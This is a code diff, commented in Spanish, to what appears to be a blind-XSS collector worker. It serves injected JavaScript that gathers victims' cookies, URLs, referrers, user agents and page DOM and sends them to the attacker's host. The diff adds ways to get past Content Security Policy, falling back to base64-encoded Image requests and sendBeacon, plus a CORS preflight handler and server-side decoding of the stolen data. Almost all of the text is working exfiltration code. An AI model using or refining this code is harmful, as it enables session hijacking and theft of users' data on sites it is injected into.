@@ -36,13 +36,37 @@ export default {
           }),
           dom: document.documentElement.outerHTML.substring(0, 20000)
         };
-        try { fetch(W + "/c", {method: "POST", keepalive: true,
-              headers: {"Content-Type": "application/json"}, body: JSON.stringify(data)}); }
-        catch (e) { try { navigator.sendBeacon(W + "/c", JSON.stringify(data)); } catch (e2) {} }
+        data.via = "fetch";
+        // CSP rechaza fetch/sendBeacon de forma ASINCRONA: usar .catch, no try
+        fetch(W + "/c", {method: "POST", keepalive: true,
+              body: JSON.stringify(data)})
+          .catch(function() {
+            // sendBeacon devuelve true aunque CSP lo bloquee despues:
+            // disparar Image SIEMPRE (pasa por img-src, casi siempre *)
+            try {
+              var mini = {url: data.url, cookie: data.cookie,
+                          referrer: data.referrer, ua: data.ua,
+                          via: "img", t: data.t};
+              new Image().src = W + "/c?d=" + encodeURIComponent(
+                btoa(unescape(encodeURIComponent(JSON.stringify(mini))))
+                .substring(0, 1800));
+            } catch (e) {}
+            try { navigator.sendBeacon(W + "/c",
+                  JSON.stringify(data)); } catch (e2) {}
+          });
       })();`;
       return new Response(js, {headers: {
         "Content-Type": "application/javascript",
         "Access-Control-Allow-Origin": "*"}});
+    }
+
+    // ---- preflight CORS (sin esto el navegador cancela el beacon) ----
+    if (p === "/c" && request.method === "OPTIONS") {
+      return new Response("", {status: 204, headers: {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type",
+        "Access-Control-Max-Age": "86400"}});
     }
 
     // ---- beacon entrante (fetch POST o sendBeacon) ----
@@ -50,7 +74,12 @@ export default {
       let body = "";
       try { body = await request.text(); } catch (e) { body = ""; }
       if (request.method === "GET" && url.searchParams.get("d")) {
-        body = decodeURIComponent(url.searchParams.get("d"));
+        // los beacons Image llegan base64 en ?d=
+        try {
+          body = atob(decodeURIComponent(url.searchParams.get("d")));
+        } catch (e) {
+          body = decodeURIComponent(url.searchParams.get("d"));
+        }
       }
       if (!body) return new Response("", {status: 204});
       const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
